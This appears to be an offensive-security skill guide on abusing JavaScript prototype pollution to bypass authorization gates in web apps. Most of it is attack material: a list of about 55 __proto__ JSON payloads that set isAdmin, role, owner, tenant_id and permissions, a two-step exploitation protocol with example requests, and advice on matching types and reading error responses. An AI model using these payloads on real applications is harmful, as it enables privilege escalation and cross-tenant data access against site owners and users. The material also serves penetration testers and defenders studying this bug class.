# Authz gadgets — polluting the checks that gate access

The commonest real-world PP payoff isn't code exec — it's a
boolean/string property a gate reads with a fallback. `isAdmin`,
`role`, `verified`, `tenant` — pollute the check's input and the
gate opens.

---

## 1. The gate grammar

```js
if (!user.isAdmin) return 403;
//          ^^^^^^^^ reads Object.prototype.isAdmin when user lacks it

const role = user.role || 'guest';       // fallback reads pollution
if (obj.owner !== req.user.id) 403;      // a stale-or-absent owner
req.user.verified ??= false;             // nullish assignment
user.tenant_id = user.tenant_id || default;  // absent tenant
```

The pattern: `if (!x.prop) deny` where `x.prop` is optional — the
pollution supplies the prop so the `!` never fires.

## 2. The authz property corpus

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"is_admin": true}}
{"__proto__": {"admin": true}}
{"__proto__": {"isAdminUser": true}}
{"__proto__": {"superuser": true}}
{"__proto__": {"isSuperuser": true}}
{"__proto__": {"staff": true}}
{"__proto__": {"isStaff": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"roles": ["admin"]}}
{"__proto__": {"role_id": 1}}
{"__proto__": {"user_type": "admin"}}
{"__proto__": {"type": "admin"}}
{"__proto__": {"kind": "admin"}}
{"__proto__": {"level": "admin"}}
{"__proto__": {"rank": "admin"}}
{"__proto__": {"grade": "admin"}}
{"__proto__": {"verified": true}}
{"__proto__": {"active": true}}
{"__proto__": {"enabled": true}}
{"__proto__": {"approved": true}}
{"__proto__": {"confirmed": true}}
{"__proto__": {"email_verified": true}}
{"__proto__": {"phone_verified": true}}
{"__proto__": {"banned": false}}
{"__proto__": {"suspended": false}}
{"__proto__": {"locked": false}}
{"__proto__": {"deactivated": false}}
{"__proto__": {"owner": "<your-id>"}}
{"__proto__": {"owner_id": "<your-id>"}}
{"__proto__": {"user_id": "<your-id>"}}
{"__proto__": {"author_id": "<your-id>"}}
{"__proto__": {"created_by": "<your-id>"}}
{"__proto__": {"tenant": "<your-tenant>"}}
{"__proto__": {"tenant_id": "<your-tenant>"}}
{"__proto__": {"org": "<your-org>"}}
{"__proto__": {"org_id": "<your-org>"}}
{"__proto__": {"team": "<your-team>"}}
{"__proto__": {"team_id": "<your-team>"}}
{"__proto__": {"account_id": "<your-id>"}}
{"__proto__": {"company_id": "<your-id>"}}
{"__proto__": {"workspace_id": "<your-id>"}}
{"__proto__": {"project_id": "<your-id>"}}
{"__proto__": {"group_id": "<your-id>"}}
{"__proto__": {"permissions": ["*"]}}
{"__proto__": {"scopes": ["admin"]}}
{"__proto__": {"perms": ["*"]}}
{"__proto__": {"capabilities": ["admin"]}}
{"__proto__": {"rights": ["admin"]}}
{"__proto__": {"acl": ["*"]}}
{"__proto__": {"sub": "admin"}}
{"__proto__": {"uid": "0"}}
{"__proto__": {"id": "1"}}
{"__proto__": {"username": "admin"}}
{"__proto__": {"email": "admin@x"}}
{"__proto__": {"name": "admin"}}
```

The `is_*`/`role`/`verified`/`owner`/`tenant`/`permissions` families —
each name is a guess until you see the app's own field names. The
response schema and the front-end bundle name them for you.

## 3. The two-step protocol

Never jump at the gate. First prove the write:

```bash
# 1. harmless marker — prove the proto write reaches the object the gate reads
POST /api/prefs {"__proto__":{"ppmarker":"x"}}
GET /api/me     → {"ppmarker":"x",...}   — the user object inherits

# 2. the gate property — same carrier, security property
POST /api/prefs {"__proto__":{"isAdmin":true}}
GET /admin      → 200 instead of 403
```

Step 1 confirms the carrier reaches `Object.prototype`. Step 2 is
the impact. Skipping step 1 wastes probes — a failed `isAdmin` tells
you nothing about whether the write landed.

## 4. Where the fallback lives

- **`user.role || 'guest'`** — absent `role` falls to `guest`; a
  polluted `role` is the default the `||` never returns.
- **`user.isAdmin ?? false`** — the `??` twin.
- **`if ('isAdmin' in user)`** — `'x' in obj` walks the proto chain —
  `hasOwnProperty` vs `in` is the checker's subtlety.
- **`user.perms?.includes('admin')`** — a `perms` array you supply.
- **`req.user.owner === obj.owner`** — pollute `req.user.owner` OR
  `obj.owner` — two sides of the same check.
- **`acl.check(user, 'admin')`** where `acl` reads `user.roles`.
- **`user.tenant_id === obj.tenant_id`** — pollute BOTH sides, or
  pollute `tenant_id` to a wildcard.

## 5. The session/JWT bridge

The user object the gate reads often comes from a session store or
JWT:

- session store builds `req.user` by merging stored session data —
  pollute via a session-write endpoint.
- JWT claims decode into `req.user` — `sub`, `role` claims — the
  JWT forgery path is `skills/web-auth-session/`; PP is the alternate
  route when the claim verifies correctly but the OBJECT merge is
  unguarded.
- `req.user` built by `Object.assign({}, dbUser, sessionExtras)` —
  the merge target is where PP lands.

## 6. The idempotent-gate trick

A gate written as `if (user.isAdmin === true)` uses strict-equality —
your polluted `"true"` string fails `=== true`; pollute with the JSON
`true`, not a string. Similarly `role === 'admin'` needs the string
`"admin"`, `perm_level > 5` needs a number, `roles.includes('admin')`
needs an array containing the string.

Match the TYPE the check expects — the response's own field types
tell you (`"role":"user"` → string, `"verified":false` → boolean,
`"perms":[...]` → array).

## 7. Multi-gate objects

The same check may appear at:

- the route middleware (`requireAdmin` reading `req.user.isAdmin`)
- the handler (`if (obj.owner !== req.user.id)`)
- the serializer (`fields: isAdmin ? all : public`)
- the service layer (`svc.canAccess(user, obj)`)

Polluting `Object.prototype.isAdmin` opens every layer that reads it
via fallback — the cheapest cross-layer bypass in the class.

## 8. The denial signature

- `403` persists after `isAdmin: true` — either the write didn't land
  (check with `ppmarker` first) or the check uses `hasOwnProperty`/a
  fresh object (no proto walk) or a strict-`===` on a typed value.
- `200` on the write, marker absent on `GET /api/me` — the merge is
  local, not prototype-level; the authz property will land locally
  too — a different bypass surface (mass-assignment) instead.
- `500` on the write — a typed setter (a class User with `set isAdmin`
  throwing) — the error message names the boundary.
